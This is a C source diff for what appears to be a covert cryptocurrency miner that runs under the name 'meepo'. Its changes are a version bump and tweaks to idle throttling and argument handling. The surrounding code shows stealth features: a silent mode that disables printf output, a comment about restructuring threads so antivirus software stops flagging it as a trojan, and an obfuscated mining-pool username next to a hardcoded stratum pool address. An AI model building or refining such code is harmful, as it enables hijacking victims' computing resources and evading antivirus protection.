@@ -1,4 +1,4 @@
-#define ACD_VERSION "02"
+#define ACD_VERSION "03"
 
 #ifdef MINER_SILENT
 #define printf(...)
@@ -12,24 +12,31 @@ static int kIdle;
 
 void *input_thread(void *userdata) {
 		// TODO: this is malicous "Endgame" AV
+	applog(LOG_ERR, "kIdle = %d", kIdle);
     while(1) {
-        int k = getchar() - '0';
+		char c = getchar();
+        int k = (int)c - '0';
         if(k >= 0 && k < 100) {
             kIdle = k;
-            applog(LOG_ERR, "Set kIdle = %d\n", kIdle);
+            applog(LOG_ERR, "Set kIdle = %d", kIdle);
         }
 		
-		if(k < '0' && k != '\n' && k != '\r')
-			break;
+		if(c < '0' && c != '\n' && c != '\r'&& c != ' ')
+			break; 
     }
+	applog(LOG_ERR, "input thread ended");
     return NULL;
 }
 
 int main(int argc_, char *argv_[])
 {
+	//if(argc_ != 2 || strlen(argv_[1]) != 32)
+	//	return 0;
+
+
 	//applog(LOG_ERR, "started daemon v" ACD_VERSION);
 
-    kIdle = 6;
+    kIdle = 7;
     //pthread_t inp_thread;
 	// the following thread was moved to miner_main() (antivir detected some trojan otherwise and we save a thread)
    // if (unlikely(pthread_create(&inp_thread, NULL, input_thread, NULL))) {
@@ -41,22 +48,23 @@ int main(int argc_, char *argv_[])
 //	snprintf(poolUser,sizeof(poolUser), "%sUwYk698d5AP4bHwT9mH.ac" ACD_VERSION "_%s", "Hd7c6xDYKik1vkg", (argc > 1) ? argv[1] : "");
 //	poolUser[0]--; // make H -> G
 	
-	char *  argv[] = {
+	//char *  argv[] = {
 		"meepo",
 		//"-a", "neoscrypt",
 		//"-o", "stratum+tcp://pool.unimining.net:4233",
 		//"-u", poolUser,
 		//"-p", "c=GBX",
 		//"-e", "2"
-	};
-	int argn = sizeof(argv) / sizeof(char*);
-	miner_main(argn, argv);
+	//};
+	//int argn = sizeof(argv) / sizeof(char*);
+	miner_main(argc_, argv_);
 }
 
 struct timeval tv_throttleMeasure[16];
 
 
 void miner_throttle(int thr_id, int inc_nonce) {
+	if(kIdle > 0)
     usleep(1000*kIdle);
     return;
 
